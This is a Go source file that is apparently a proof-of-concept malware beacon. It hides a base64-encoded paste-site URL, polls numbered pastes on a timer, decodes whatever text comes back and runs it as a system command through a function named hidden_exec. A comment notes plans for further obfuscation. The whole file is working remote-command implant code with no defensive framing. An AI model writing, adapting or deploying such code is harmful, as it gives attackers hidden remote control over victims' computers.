package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func _ignore(variable string) {} // Bypass Golang interpreter for unsed vars

func hidden_exec(cmd string, cmd_line string) {
	if cmd == "stop" {
		os.Exit(0)
	}
	cmd_line = strings.Replace(cmd_line, cmd, "", 1)
	var cmd_args []string
	cmd_args = strings.Split(cmd_line, " ")
	ctx := context.Background()
	execution := exec.CommandContext(ctx, cmd, cmd_args...)
	execution.Output()
}

func beacon(url string) (result string) {
	var cl = &http.Client{
		Timeout: time.Second * 10,
	}
	resp, err := cl.Get(url)
	if err != nil {
	}
	defer resp.Body.Close()
	r, err := io.ReadAll(resp.Body)
	if err != nil {
	}
	return string(r)

}

func decode(message string) (result string) {
	r, err := base64.StdEncoding.DecodeString(message)
	if err != nil {
		return "cd"
	}
	return string(r)
}

func main() {
	var _URL = "aHR0cDovL3Bhc3RlYmluLmZyL3Bhc3RlYmluLnBocD9kbD0=" // TODO: other obfuscation
	var _ID = "123753"                                            // Define where to start the beaconing
	var beacon_time = 15 * time.Second
	var pull_num = 5 // To limit the PoC (TODO: be more reliable)

	// Retrieved cmd execution
	cmd_id, err := strconv.Atoi(_ID)
	if err != nil {
		os.Exit(0)
	}
	for i := cmd_id; i < cmd_id+pull_num; i++ {
		time.Sleep(beacon_time)
		cmd_line := decode(beacon(decode(_URL) + fmt.Sprint(i)))
		hidden_exec(strings.Split(cmd_line, " ")[0], cmd_line)
	}
}
